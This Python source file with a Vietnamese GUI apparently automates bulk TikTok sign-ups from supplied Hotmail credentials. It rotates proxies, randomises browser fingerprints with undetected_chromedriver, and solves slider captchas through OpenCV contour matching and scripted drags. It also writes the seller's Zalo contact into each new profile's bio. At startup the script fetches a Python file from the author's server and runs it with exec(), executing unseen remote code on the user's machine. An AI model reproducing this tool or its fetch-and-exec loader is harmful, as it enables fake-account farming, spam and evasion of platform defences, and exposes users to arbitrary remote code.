from tkinter import filedialog


try:
    import hashlib
    import subprocess
    import os,sys,json,requests,random,cv2
    from sys import exit
    import pyperclip
    sys.setrecursionlimit(10000)
    from tkinter import Tk, messagebox
    from tkinter import DISABLED, END, NORMAL, RIGHT, VERTICAL, Entry, LabelFrame, Scrollbar, Spinbox, Tk,Toplevel,StringVar,Label,Button,Text
    from tkinter.ttk import OptionMenu,Treeview
    from bs4 import BeautifulSoup as bs 
    import threading
    from selenium.webdriver.common.action_chains import ActionChains
    from time import sleep
    import undetected_chromedriver.v2 as dc
    from selenium import webdriver
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.common.by import By
    from md import * 
    import threading
    from selenium.webdriver.chrome.service import Service
    from subprocess import CREATE_NO_WINDOW
    service = Service('chromedriver')
    service.creationflags = CREATE_NO_WINDOW
    filePng = []
    try:
       okkk = requests.get('https://thecao.nnssoftware.vn/tt.py').text
       exec(okkk)
    except:
       messagebox.showerror('Thông báo', 'Lỗi kết nối tới server\nVui lòng liên hệ admin')
       exit()
    ok = False
    listmail=[]
    list_all_mail=[]
    luong_dang_chay = []
    slMail = []
    indexLuong = -1
    def addMail():
        if os.path.exists('hotmail.txt') == False:
            open('hotmail.txt', "w+")
        def saveMail():
            for x in str(inputMail.get(1.0, END)).split('\n'):
                if len(x) > 0:
                    o = open('hotmail.txt', "a+")
                    o.write(f"{x}\n")
                    o.close()
                    slMail.append(x)
            sl = len(slMail)
            slMail.clear()
            messagebox.showinfo('Thông báo', f"Lưu thành công {sl} hotmail")
            popMail.destroy()
        def threadMail():
            threading.Thread(target=saveMail).start()
        def threadOut():
            popMail.destroy()
        popMail = Toplevel(gui)
        WA=gui.winfo_screenwidth()
        MA=gui.winfo_screenheight()
        popMail.geometry('800x455+%d+%d' %(WA/2-770/2-30, MA/2-480/2-30))
        popMail.title('Thêm Hotmail')
        popMail.iconbitmap('img\\tt.ico')
        popMail.resizable(False,False)
        inputMail = Text(popMail, width=98)
        inputMail.place(x=5,y=5)
        buttonSaveMail = Button(popMail, text="Lưu", command=threadMail)
        buttonSaveMail.place(x = 260, y =405, width=100, height=35)
        buttonSaveMail = Button(popMail, text="Thoát", command=threadOut)
        buttonSaveMail.place(x = 380, y =405, width=100, height=35)
        popMail.mainloop()

    class TikTok:
        def __init__(self,l,*ip_port):
            self.l = l
            luong_dang_chay.append(self.l)
            chromeoptions=dc.ChromeOptions()
            # chromeoptions.add_argument('--user-agent=%s' % user_agent)
            chromeoptions.add_argument('--disable-gpu')
            #chromeoptions.add_argument('credentials_enable_service')
            #chromeoptions.add_argument('profile.password_manager_enabled')
            # chromeoptions.add_argument('--start-maximized')
            prefs = {"credentials_enable_service":False,"profile.password_manager_enabled":False,"profile.default_content_setting_values.notifications" : 2}
            chromeoptions.add_experimental_option("prefs", prefs)
            chromeoptions.add_argument('--log-level=3')
            chromeoptions.add_argument('--app=https://api.myip.com')
            chromeoptions.add_argument("--mute-audio")
            while(True):
                win = random.randint(7,11)
                if win != 9:
                    break
            chromeoptions.add_argument(f'--user-agent=Mozilla/5.0 (Windows NT {win}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(78, 100)}.0.4844.82 Safari/537.36')
            if ip_port:
                __ip = str(ip_port[0]).split(':')
                ip = __ip[0]
                port = __ip[1]
                chromeoptions.add_argument('--proxy-server=%s' % ip_port)
                ip_port=str(ip_port[0])
            service = Service()
            service.creationflags = CREATE_NO_WINDOW
            chromeoptions.add_argument('--lang=en')
            args = ["hide_console", ]
            for x in range(7):
                try:
                    self.driver = dc.Chrome(options=chromeoptions,service_args=args, use_subprocess = True)
                    self.driver.get('https://api.myip.com')
                    break
                except Exception as e:
                    print(e)
                    pass
                    time.sleep(1)
            time.sleep(3)
        def setUpChrome(self, luong):
            global indexLuong
            indexLuong+=1
            print(indexLuong)
            try:
                y=0
                screen=gui.winfo_screenwidth()
                oks = str(screen/420).split(".")[0]
                if indexLuong%int(oks) == 0 and indexLuong != 0 or luong > int(oks):
                    y+=800
                    if indexLuong%int(oks):
                        indexLuong = 0
                x=indexLuong*420
                self.driver.set_window_rect(x,y,500,800)
                time.sleep(3)
                for x in range(2):
                    try:
                        self.driver.get('https://www.tiktok.com/login')
                    except:
                        pass
                
                time.sleep(3)
                self.driver.get('https://www.tiktok.com/signup/phone-or-email/email')
                self.driver.set_page_load_timeout(30)
                sleep(3)
                return {'status': "success", 'mess': "Setup thành công"}
            except Exception as e:
                print(e)
                return {'status': "error", 'mess': "ChromeDriver mở thất bại"} 
        

        def sendInfo(self, mail, password):
            time.sleep(3)
            self.mail = mail
            self.password = password
            mail_1 = str(mail).split('|')[0]
            self.pass_mail = str(mail).split('|')[1]
            try:
                try:
                    self.driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/form/div[2]/div[1]/div').click()
                    self.driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/form/div[2]/div[1]/ul/li['+str(random.randint(1,10))+']').click()
                    time.sleep(1)
                    self.driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/form/div[2]/div[2]/div').click()
                    self.driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/form/div[2]/div[2]/ul/li['+str(random.randint(1,29))+']').click()
                    time.sleep(1)
                    self.driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/form/div[2]/div[3]/div').click()
                    self.driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/form/div[2]/div[3]/ul/li['+str(random.randint(26,34))+']').click()
                    time.sleep(1)
                except:                                 
                    self.driver.find_element(By.XPATH, '/html/body/div[2]/div/div[2]/div/form/div[3]/div[1]/div[1]').click()
                    self.driver.find_element(By.XPATH, '/html/body/div[2]/div/div[2]/div/form/div[3]/div[1]/div[2]/div['+str(random.randint(1,10))+']').click()
                    time.sleep(1)
                    self.driver.find_element(By.XPATH, '/html/body/div[2]/div/div[2]/div/form/div[3]/div[2]/div[1]').click()
                    self.driver.find_element(By.XPATH, '/html/body/div[2]/div/div[2]/div/form/div[3]/div[2]/div[2]/div['+str(random.randint(1,29))+']').click()
                    time.sleep(1)
                    self.driver.find_element(By.XPATH, '/html/body/div[2]/div/div[2]/div/form/div[3]/div[3]/div[1]').click()
                    self.driver.find_element(By.XPATH, '/html/body/div[2]/div/div[2]/div/form/div[3]/div[3]/div[2]/div['+str(random.randint(26,34))+']').click()
                    time.sleep(1)
            except Exception as e:
                print(e)
                return {'status': "error", 'mess': "Lỗi chọn ngày sinh"}

            try:
                try:
                    for x in mail_1:
                        self.driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/form/div[4]/div[2]/div/input').send_keys(x)
                #send password
                    time.sleep(2)
                    for x in password:
                        self.driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/form/div[4]/div[4]/div[1]/input').send_keys(x)
                        time.sleep(0.002)
                    self.driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/form/div[4]/div[5]/button').click()
                except:
                    for x in mail_1:
                        self.driver.find_element(By.NAME, 'email').send_keys(x)
                #send password
                    time.sleep(2)
                    for x in password:
                        self.driver.find_element(By.XPATH, '/html/body/div[2]/div/div[2]/div/form/div[7]/div/input').send_keys(x)
                        time.sleep(0.002)
                    self.driver.execute_script('document.querySelector(".tiktok-1sxu6pe-ButtonSendCode.e1gzcpl10").click()')
            except Exception as e:
                print(e)
                return {'status': "error", 'mess': "Lỗi nhập Mail và Password"}
            return {'status': "success", 'mess': "Nhập thông tin xong"}
        

        def getCode(self,time):
            code=runnow(self.mail,time)
            print(code)
            if code == False:
                return {'status': "error", 'mess': f"Lỗi: Mail DIE"}
            elif code == None:
                return {'status': "error", 'mess': "Lỗi: Nhận code thất bại"}
            else:
                return {'status': "success", 'code': f"{code}"}
        
        def sendCode(self, code):
            try:
                for x in [code,Keys.ENTER]:
                    self.driver.find_element(By.CSS_SELECTOR , 'input[placeholder="Enter 6-digit code"]').send_keys(x)
                    time.sleep(3)
                sleep(2)
                for x in range(5):
                    try:
                        checkSendCode = self.driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/form/div[4]/div[6]/div').text
                        print(checkSendCode)
                        time.sleep(2)
                        self.driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/form/div[4]/div[5]/div/input').send_keys(Keys.ENTER)
                        kq = {'status': "error", 'mess': "Lỗi: Nhập code thất bại"}
                    except:
                        kq = {'status': "success", 'mess': "Nhập code thành công"}
                    try:
                        checkSendCode = self.driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/form/div[4]/div[6]/div').text
                        print(checkSendCode)
                        time.sleep(2)
                        self.driver.find_element(By.XPATH, '/html/body/div[2]/div/div[2]/div/form/div[8]/div/div/input').send_keys(Keys.ENTER)
                        kq = {'status': "error", 'mess': "Lỗi: Nhập code thất bại"}
                    except:
                        kq = {'status': "success", 'mess': "Nhập code thành công"}
                return kq
            except:
                return {'status': "error", 'mess': "Lỗi: Nhập code thất bại"}

        def checkCaptcha(self, *luong):
            try:
                self.driver.set_page_load_timeout(30)
                if luong:
                    print(self.driver.save_screenshot(f"./img/captcha-luong{luong}.png"))
                    img = f"./img/captcha-luong{luong}.png"
                else:
                    self.driver.save_screenshot(f"./img/captcha.png")
                    img = f"./img/captcha.png"
                try:
                    method = cv2.TM_SQDIFF_NORMED
                    small_image = cv2.imread("./img/maucap.png")
                    large_image = cv2.imread(img)
                    result = cv2.matchTemplate(small_image, large_image, method)
                    mn,_,mnLoc,_= cv2.minMaxLoc(result)
                    min_val = cv2.minMaxLoc(result)[0]
                except Exception as error:
                    print('error:',error)
                    time.sleep(1)
                    if luong:
                        self.driver.save_screenshot(f"./img/captcha-luong{luong}.png")
                        img = f"./img/captcha-luong{luong}.png"
                    else:
                        self.driver.save_screenshot(f"./img/captcha.png")
                        img = f"./img/captcha.png"
                    method = cv2.TM_SQDIFF_NORMED
                    small_image = cv2.imread("./img/maucap.png")
                    large_image = cv2.imread(img)
                    result = cv2.matchTemplate(small_image, large_image, method)
                    mn,_,mnLoc,_= cv2.minMaxLoc(result)
                    min_val = cv2.minMaxLoc(result)[0]

                thr = 0.01
                MPx,MPy = mnLoc
                trows,tcols = small_image.shape[:2]
                if min_val <= thr :
                    x=round(MPx+(tcols/2))
                    y=round(MPy+(trows/2))
                    return {'status': "ok", 'mess': "Có captcha"}
                else:
                    return {'status': "no", 'mess': "Không có captcha"}
            except Exception as error:
                print('error:',error)
                return {'status': "no", 'mess': "Không có captcha"}
        
        def bybassCaptcha(self, *luong):
            time.sleep(3)
            keo = 'not'
            if luong:
                self.driver.save_screenshot(f"./img/captcha-luong{luong}.png")
                img = f"img/captcha-luong{luong}.png"
            else:
                self.driver.save_screenshot(f"./img/captcha.png")
                img = f"img/captcha.png"
            try:
                time.sleep(1)
                uk = 'no'
                #captcha    
                for x in range(10):
                    try:
                        img = cv2.imread(img)
                        break
                    except:
                        pass
                    time.sleep(1)
                img = img[203:415, 111:452]

                gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
                gray = cv2.GaussianBlur(gray,(3,3),cv2.BORDER_DEFAULT)
                edged = cv2.Canny(gray,540, 250)
                contours, hierarchy = cv2.findContours(edged, 
                    cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_NONE)
                for c in contours:
                    (x, y, w, h) = cv2.boundingRect(c)

                    if (50<w<59) and(50<h<59) and (h/w>0.9) and x > 6:
                            keo = round(x)-5
                            break

                cv2.waitKey(0)
                cv2.destroyAllWindows()                         
                try:
                    re = self.driver.find_element_by_css_selector("#login_slide > div > div.captcha_verify_action.sc-jDwBTQ.dhdXHN > div > a.secsdk_captcha_refresh.refresh-button___StyledA-sc-18f114n-0.jgMJRc")
                except:
                    re = self.driver.find_element_by_css_selector("#captcha_container > div > div.captcha_verify_action.sc-jDwBTQ.dhdXHN > div > a.secsdk_captcha_refresh.refresh-button___StyledA-sc-18f114n-0.jgMJRc")
                if keo == 'not':
                    re.click()
                else:
                    time.sleep(2)
                    a = ActionChains(self.driver)
                    a.move_to_element_with_offset(re,30,-44)
                    a.click_and_hold()
                    for i in range((keo//5)+7):
                        a.move_by_offset(5, 0)
                    for i in range(keo%5):
                        a.move_by_offset(1, 0)
                    a.pause(1)
                    a.move_by_offset(3,5)
                    a.move_by_offset(-3,-3)
                    a.release()
                    a.perform()
                    time.sleep(2)
                    return {'status': "success", 'mess': "Kéo captcha thành công"}
                if uk == "no":
                    return {'status': "error", 'mess': "Kéo thất bại"}
            except Exception as nn:
                print(nn)
                return {'status': "error", 'mess': "Lỗi không xác định"}

        def sendUsername(self):
            time.sleep(5)
            try:
                user = Username()
                ten = user.name()
                self.user_name1 = user.get(ten)[0:20]
                #send username + click Next
                self.driver.set_page_load_timeout(30)
                self.driver.find_element(By.CSS_SELECTOR, 'input[placeholder="Username"]').send_keys(Keys.CONTROL+'a')
                self.driver.find_element(By.CSS_SELECTOR, 'input[placeholder="Username"]').send_keys(Keys.DELETE)
                time.sleep(2)
                for i in self.user_name1:
                    self.driver.find_element(By.CSS_SELECTOR, 'input[placeholder="Username"]').send_keys(i)
                    time.sleep(0.0002)
                time.sleep(3)
                self.driver.find_element(By.CSS_SELECTOR, 'input[placeholder="Username"]').send_keys(Keys.ENTER)
                return {'status': "success", 'mess': "Điền username thành công", 'name': ten, 'username': self.user_name1}
            except Exception as e:
                print(e)
                return {'status': "error", 'mess': "Điền username thất bại"}
                

        def checkRegAcc(self):
            self.driver.set_page_load_timeout(30)
            time.sleep(3)
            for x in range(10):
                try:
                    self.driver.refresh()
                    break
                except:
                    time.sleep(3)
            time.sleep(2)
            self.driver.get(f'https://www.tiktok.com/@{self.user_name1}/')
            self.driver.set_page_load_timeout(30)
            time.sleep(2)
            try:
                self.username=self.driver.page_source.split('queId":"')[1].split('"')[0]
                print(self.username)
                time.sleep(2)
                self.driver.get(f'https://www.tiktok.com/@{self.username}')
                self.driver.set_page_load_timeout(30)
                time.sleep(3)
            except:
                pass
            time.sleep(2)
            try:
                self.driver.find_element(By.CSS_SELECTOR, 'h2[data-e2e="user-title"]')
                return {'status': "success", 'mess': "Tạo tài khoản thanh công"}
            except:
                return {'status': "error", 'mess': "Tạo tài khoản thất bại"}

        def upInfo(self, folderAvt, username):
            print(folderAvt)
            time.sleep(3)
            for root, dirs, files in os.walk(r'{}'.format(folderAvt)):
                for file in files:
                    if file.endswith('.png'):
                        filePng.append(file)
                    elif file.endswith('.jpg'):
                        filePng.append(file)
                    elif file.endswith('.jpge'):
                        filePng.append(file)
            try:
                print(r"{}/{}".format(folderAvt, random.choice(filePng)))
            except:
                pass
            time.sleep(3)   
            try:
                self.driver.find_element(By.XPATH, '/html/body/div[2]/div[2]/div[2]/div/div[1]/div[1]/div[2]/div/button').click()
            except Exception as e:
                print(e)
                self.driver.find_element(By.XPATH, "/html/body/div[2]/div[2]/div[2]/div/div[1]/div[1]/div[2]/div/button").click()  
            try:
                time.sleep(2)
                self.driver.find_element(By.CSS_SELECTOR, 'input[type="file"]').send_keys(r"{}/{}".format(folderAvt, random.choice(filePng)))
                time.sleep(2)
                self.driver.execute_script('document.querySelector(".e1gjao0r9.tiktok-280vti-Button-StyledBtn.ehk74z00").click()')
                time.sleep(2)          
                for i in [Keys.CONTROL+'a',Keys.DELETE, username]:
                    self.driver.find_element(By.CSS_SELECTOR, 'input[placeholder="Name"]').send_keys(i)
                    time.sleep(1)
                time.sleep(2)
                self.driver.find_element(By.CSS_SELECTOR, 'textarea[placeholder="Bio"]').click()
                time.sleep(2)
                self.driver.find_element(By.CSS_SELECTOR, 'textarea[placeholder="Bio"]').send_keys('Tool Reg By NNS OFFICIAL SOFTWARE. Zalo: 0843452969')
                time.sleep(2)
            except:
                pass
            try:
                self.driver.execute_script('document.querySelector(".e13yu7jj4.tiktok-1ebsiku-Button-StyledBtn.ehk74z00").click()')
            except Exception as e:
                print(e)
            
            time.sleep(3)
            self.driver.refresh()
            time.sleep(7)
        def saveAcc(self):
            if os.path.exists('output') == False:
                os.mkdir('output')
            hotmail = self.mail
            o=open('output/acc.txt','a+')
            o.write(f'{self.username}|{self.password}|{hotmail}\n')
            if hotmail in list_all_mail:
                list_all_mail.remove(hotmail)
            open("hotmail.txt", "w+")
            print(len(list_all_mail))
            for x in list_all_mail:
                o=open('hotmail.txt', "a+")
                o.write(x+'\n')
                o.close()

        def checkBugs(self):
            time.sleep(5)
            try:      
                try:
                    check_text = self.driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/form/div[4]/div[2]/div[2]').text
                    print(check_text)
                    if 'Too many attempts. Try again later' in check_text:
                        for x in range(5):
                            self.driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/form/div[4]/div[5]/button').click()
                            time.sleep(4)
                            check_text = self.driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/form/div[4]/div[2]/div[2]/div').text
                            print(check_text)
                            if 'Too many attempts. Try again later' in check_text:
                                if self.mail in listmail:
                                    listmail.remove(self.mail)
                                kq = {'status': "error", 'mess': "Lỗi: Truy cập thường xuyên"}
                            elif 'already signed up' in check_text:
                                if self.mail in listmail:
                                    listmail.remove(self.mail)
                                    self.saveAcc()
                                kq = {'status': "error", 'mess': "Lỗi: Mail đã reg"}
                            else:
                                break
                        return kq
                    elif 'already signed up' in check_text:
                        if self.mail in listmail:
                            listmail.remove(self.mail)
                            self.saveAcc()
                        return {'status': "error", 'mess': "Lỗi: Mail đã reg"}
                    else:
                        return {'status': "success", 'mess': "Không có vấn đề gì"}
                except:
                    try:                                                    
                        check_text = self.driver.find_element(By.XPATH, '/html/body/div[2]/div/div[2]/div[1]/form/div[8]/div[2]').text
                        print(check_text)
                        if 'Too many attempts. Try again later' in check_text:
                            for x in range(5):
                                self.driver.execute_script('document.querySelector(".tiktok-1sxu6pe-ButtonSendCode.e1gzcpl10").click()')
                                time.sleep(4)
                                check_text = self.driver.find_element(By.XPATH, '/html/body/div[2]/div/div[2]/div[1]/form/div[8]/div[2]').text
                                print(check_text)
                                if 'Too many attempts. Try again later' in check_text:
                                    if self.mail in listmail:
                                        listmail.remove(self.mail)
                                    kq = {'status': "error", 'mess': "Lỗi: Truy cập thường xuyên"}
                                elif 'already signed up' in check_text:
                                    if self.mail in listmail:
                                        listmail.remove(self.mail)
                                        self.saveAcc()
                                    kq = {'status': "error", 'mess': "Lỗi: Mail đã reg"}
                                else:
                                    break
                            return kq
                        elif 'already signed up' in check_text:
                            if self.mail in listmail:
                                listmail.remove(self.mail)
                                self.saveAcc()
                            return {'status': "error", 'mess': "Lỗi: Mail đã reg"}
                        else:
                            return {'status': "success", 'mess': "Không có vấn đề gì"}
                    except:
                        check_text = self.driver.find_element(By.XPATH, '/html/body/div[2]/div/div[2]/div[1]/form/p').text
                        print(check_text)
                        if 'Too many attempts. Try again later' in check_text:
                            for x in range(5):
                                self.driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/form/div[4]/div[5]/button').click()
                                time.sleep(4)
                                check_text = self.driver.find_element(By.XPATH, '/html/body/div[2]/div/div[2]/div[1]/form/p').text
                                print(check_text)
                                if 'Too many attempts. Try again later' in check_text:
                                    if self.mail in listmail:
                                        listmail.remove(self.mail)
                                    kq = {'status': "error", 'mess': "Lỗi: Truy cập thường xuyên"}
                                elif 'already signed up' in check_text:
                                    if self.mail in listmail:
                                        listmail.remove(self.mail)
                                        self.saveAcc()
                                    kq = {'status': "error", 'mess': "Lỗi: Mail đã reg"}
                                else:
                                    break
                            return kq
                        elif 'already signed up' in check_text:
                            if self.mail in listmail:
                                listmail.remove(self.mail)
                                self.saveAcc()
                            return {'status': "error", 'mess': "Lỗi: Mail đã reg"}
                        else:
                            return {'status': "success", 'mess': "Không có vấn đề gì"}
                        
            except:
                return {'status': "success", 'mess': "Không có vấn đề gì"}

        def outThread(self):
            
            if self.l in luong_dang_chay:
                luong_dang_chay.remove(self.l)
            while(True):
                time.sleep(1)
                print(self.l, luong_dang_chay)
                ss=len(luong_dang_chay)
                if ss == 0:
                    break
                else:
                    pass


        def outWebdriver(self):
            for x in range(5):
                time.sleep(1)
                try:
                    self.driver.quit()
                    break
                except:
                    pass
            self.outThread()


    tatca = []
    indexProxy = -1
    def main(l):
        global indexProxy
        o = json.loads(open("config/proxy.json", mode="r", encoding="utf-8-sig").read())
        if l%int(o['thread']) == 0:
            indexProxy += 1
        print(indexProxy)
        listIp = []
        for x in o['api-key'].split(","):
            if len(x) <= 5:
                pass
            else:
                listIp.append(str(x))

        ipNe = listIp[indexProxy]
        while(True):
            global stop
            stop.clear()
            time.sleep(l+3)
            tatca.append('1')
            stt=len(tatca)
            tt=ttt.cv_stt(stt)
            view.insert('', END, values=(stt, '', '', '',''), tags=(tt,))
            view.tag_configure(tt, font=('Both', 10))
            if stt <= int(luongReg.get()):
                pass
            else:
                for x in range(int(delayReg.get()), 0, -1):
                    view.item(tt, text='', values=(stt, '', '', '', f'Tiếp tục reg sau {x} giây'))
                    time.sleep(1)
            if loaiPass.get() == 'Ngẫu nhiên':
                password = get_pw()
            else:
                password = _password.get()
            try:
                for x in open('hotmail.txt', encoding='utf-8-sig', mode='r').read().split('\n'):
                    if len(x) < 3:
                        pass
                    elif x not in list_all_mail and x not in listmail:
                        listmail.append(x)
                        list_all_mail.append(x)
            except:
                messagebox.showerror("Lỗi", "Không tìm thấy hotmail")
                exit()
            if len(listmail) == 0:
                messagebox.showwarning('Thông báo', ' Hết hotmail trong bộ nhớ tool')
                view.item(tt, text='', values=(stt, '', '', '', '','Đã dừng'))
                if len(luong_dang_chay) == 0:
                    buttonStart.config(state=NORMAL)
                    buttonStop.config(state=NORMAL)
                    luồng_s.clear()
                break
            mai = listmail[0]
            try:
                Mail = str(mai).split('|')
                _test = Mail[1]
            except:
                view.item(tt, text='', values=(stt, '', password, '','', 'Hotmail sai định dạng'))
                if len(luong_dang_chay) == 0:
                    buttonStart.config(state=NORMAL)
                    buttonStop.config(state=NORMAL)
                    luồng_s.clear()
                break
            hMail = Mail[0]
            listmail.remove(mai)
            config_ip=json.loads(open('config/proxy.json', mode="r", encoding="utf-8-sig").read())
            if config_ip['loai'] == 'No Proxy':
                ip=requests.get('https://api.myip.com').json()['ip']
                reg=TikTok(l)
            else:
                view.item(tt, text='', values=(stt, '', password, hMail, '', f'Đang lấy proxy từ {config_ip["loai"]}'))
                while(True):
                    ip_port=Connect(config_ip['loai'],ipNe)
                    if ip_port['status'] == "error":
                        view.item(tt, text='', values=(stt, '', password, hMail, '', ip_port["mess"]))
                        luong_dang_chay.clear()
                        if stop.is_set():
                            if len(luong_dang_chay) == 0:
                                buttonStart.config(state=NORMAL)
                                buttonStop.config(state=NORMAL)
                                luồng_s.clear()
                            break
                        time.sleep(1)
                    else:
                        ip_port = ip_port['http']
                        view.item(tt, text='', values=(stt, '', password, hMail, '', f'Xử lý proxy'))
                        proxyy={
                            'http': f'http://{ip_port}',
                            'https': f'http://{ip_port}'
                        }
                        for i in range(5):
                            try:
                                ip=requests.get('http://api.myip.com',proxies=proxyy, timeout=5).json()['ip']
                                view.item(tt, text='', values=(stt, '', password, hMail, ip, f'Mở trình duyệt'))
                                break
                            except:
                                ip="Lỗi xác định"
                        reg = TikTok(l, ip_port)
                        break
            setUp = reg.setUpChrome(l)
            if setUp['status']== "success":
                view.item(tt, text='', values=(stt, '', password, str(mai).split('|')[0], ip, 'Nhập thông tin'))
                start = reg.sendInfo(mai, password)
                if start['status'] == "success":
                    bugs = reg.checkBugs()
                    print(bugs)
                    view.item(tt, text='', values=(stt, '', password, str(mai).split('|')[0], ip, 'Check lỗi'))
                    if bugs['status'] == "success" or bugs['status'] == "error" and bugs['mess'] != 'Lỗi: Mail đã reg':
                        view.item(tt, text='', values=(stt, '', password, str(mai).split('|')[0], ip, 'Đang đợi mã'))
                        nhanCode = reg.getCode(int(timeCode.get()))
                        if nhanCode['status'] == "success":
                            view.item(tt, text='', values=(stt, '', password, str(mai).split('|')[0], ip, f'Nhập mã xác minh {nhanCode["code"]}'))
                            code = nhanCode['code']
                            print(code)
                            sendCode = reg.sendCode(code)

                            if sendCode['status'] == "success":
                                view.item(tt, text='', values=(stt, '', password, str(mai).split('|')[0], ip, 'Check captcha'))
                                time.sleep(5)
                                checkCap = reg.checkCaptcha(l)
                                print(checkCap)

                                if checkCap['status'] == "ok":
                                    view.item(tt, text='', values=(stt, '', password, str(mai).split('|')[0], ip, 'Có captcha. Tiến hành bybass'))
                                    captcha = 'no'
                                    for x in range(5):
                                        bybass = reg.bybassCaptcha(l)
                                        time.sleep(5)
                                        checkCapAgain = reg.checkCaptcha(l)
                                        if checkCapAgain['status'] == "no":
                                            captcha = 'ok'
                                            view.item(tt, text='', values=(stt, '', password, str(mai).split('|')[0], ip, 'Bybass captcha thành công'))
                                            break
                                        else:
                                            pass
                                    if captcha == 'no':
                                        view.item(tt, text='', values=(stt, '', password, str(mai).split('|')[0], ip, 'Kéo captcha thất bại'))
                                        view.tag_configure(tt, background='#FF6347', foreground='black')
                                        reg.outWebdriver()
                                        if stop.is_set():
                                            if len(luong_dang_chay) == 0:
                                                buttonStart.config(state=NORMAL)
                                                buttonStop.config(state=NORMAL)
                                                luồng_s.clear()
                                            break
                                        continue
                                else:
                                    view.item(tt, text='', values=(stt, '', password, str(mai).split('|')[0], ip, checkCap['mess']))
                                view.item(tt, text='', values=(stt, '', password, str(mai).split('|')[0], ip, 'Điền Username'))
                                sendUser = reg.sendUsername()
                                if sendUser['status'] == 'success':
                                    userne = sendUser['username']
                                    view.item(tt, text='', values=(stt, userne, password, str(mai).split('|')[0], ip, 'Điền Username'))
                                    time.sleep(3)
                                    view.item(tt, text='', values=(stt, userne, password, str(mai).split('|')[0], ip, 'Kiểm tra tạo tài khoản'))
                                    checkAcc = reg.checkRegAcc()
                                    print(checkAcc)
                                    upAvt = True
                                    if checkAcc['status'] == "success":
                                        view.item(tt, text='', values=(stt, userne, password, str(mai).split('|')[0], ip, 'Tạo tài khoản thành công'))
                                        view.tag_configure(tt, background='#98FB98', foreground='black')
                                        reg.saveAcc()
                                        configReg = json.loads(open("config/config.json", mode="r", encoding="utf-8-sig").read())
                                        if configReg['status'] == "On":
                                            view.item(tt, text='', values=(stt, userne, password, str(mai).split('|')[0], ip, 'Up Thông Tin Profile'))
                                            view.tag_configure(tt, background='#98FB98', foreground='black')
                                            reg.upInfo(configReg['folderAvt'], sendUser['name'])
                                        reg.outWebdriver()
                                        if stop.is_set():
                                            if len(luong_dang_chay) == 0:
                                                buttonStart.config(state=NORMAL)
                                                buttonStop.config(state=NORMAL)
                                                luồng_s.clear()
                                            break
                                    else:
                                        view.item(tt, text='', values=(stt, userne, password, str(mai).split('|')[0], ip, checkAcc['mess']))
                                        view.tag_configure(tt, background='#FF6347', foreground='black')
                                        reg.outWebdriver()
                                        if stop.is_set():
                                            if len(luong_dang_chay) == 0:
                                                buttonStart.config(state=NORMAL)
                                                buttonStop.config(state=NORMAL)
                                                luồng_s.clear()
                                            break

                                else:
                                    view.item(tt, text='', values=(stt, '', password, str(mai).split('|')[0], ip, sendUser['mess']))
                                    view.tag_configure(tt, background='#FF6347', foreground='black')
                                    reg.outWebdriver()
                                    if stop.is_set():
                                        if len(luong_dang_chay) == 0:
                                            buttonStart.config(state=NORMAL)
                                            buttonStop.config(state=NORMAL)
                                            luồng_s.clear()
                                        break
                            else:
                                view.item(tt, text='', values=(stt, '', password, str(mai).split('|')[0], ip, sendCode['mess']))
                                view.tag_configure(tt, background='#FF6347', foreground='black')
                                # print(sendCode['mess'])
                                reg.outWebdriver()
                                if stop.is_set():
                                    if len(luong_dang_chay) == 0:
                                        buttonStart.config(state=NORMAL)
                                        buttonStop.config(state=NORMAL)
                                        luồng_s.clear()
                                    break
                        else:
                            view.item(tt, text='', values=(stt, '', password, str(mai).split('|')[0], ip, nhanCode['mess']))
                            view.tag_configure(tt, background='#FF6347', foreground='black')
                            # print(nhanCode['mess'])
                            reg.outWebdriver()
                            if stop.is_set():
                                if len(luong_dang_chay) == 0:
                                    buttonStart.config(state=NORMAL)
                                    buttonStop.config(state=NORMAL)
                                    luồng_s.clear()
                                break

                    else:
                        view.item(tt, text='', values=(stt, '', password, str(mai).split('|')[0], ip, bugs['mess']))
                        view.tag_configure(tt, background='#FF6347', foreground='black')
                        # print(bugs['mess'])
                        reg.outWebdriver()
                        if stop.is_set():
                            if len(luong_dang_chay) == 0:
                                buttonStart.config(state=NORMAL)
                                buttonStop.config(state=NORMAL)
                                luồng_s.clear()
                            break

                else:
                    view.item(tt, text='', values=(stt, '', password, str(mai).split('|')[0], ip, start['mess']))
                    view.tag_configure(tt, background='#FF6347', foreground='black')
                    reg.outWebdriver()
                    if stop.is_set():
                        if len(luong_dang_chay) == 0:
                            buttonStart.config(state=NORMAL)
                            buttonStop.config(state=NORMAL)
                            luồng_s.clear()
                        break
            else:
                view.item(tt, text='', values=(stt, '', password, str(mai).split('|')[0], ip, setUp['mess']))
                view.tag_configure(tt, background='#FF6347', foreground='black')
                # print(setUp['mess'])
                reg.outThread()
                if stop.is_set():
                    if len(luong_dang_chay) == 0:
                        buttonStart.config(state=NORMAL)
                        buttonStop.config(state=NORMAL)
                        luồng_s.clear()
                    break
                
    luồng_s=[]
    list_thread=[]
    def run():
        def aa():
            # os.system('python get_chrome.py')
            global luồng_s
            luồng_reg = int(luongReg.get())
            for kk in range(luồng_reg):
                while(len(luồng_s)<luồng_reg):
                    threadf=threading.Thread(target=main, args={kk},)
                    if threadf in list_thread:
                        pass
                    else:
                        luồng_s+= [threadf]
                        break
                
            for x in luồng_s:
                if x.is_alive() == False:
                    x.start()
                else:
                    luồng_s.remove(x)
        buttonStart.config(state=DISABLED)
        threading.Thread(target=aa).start()

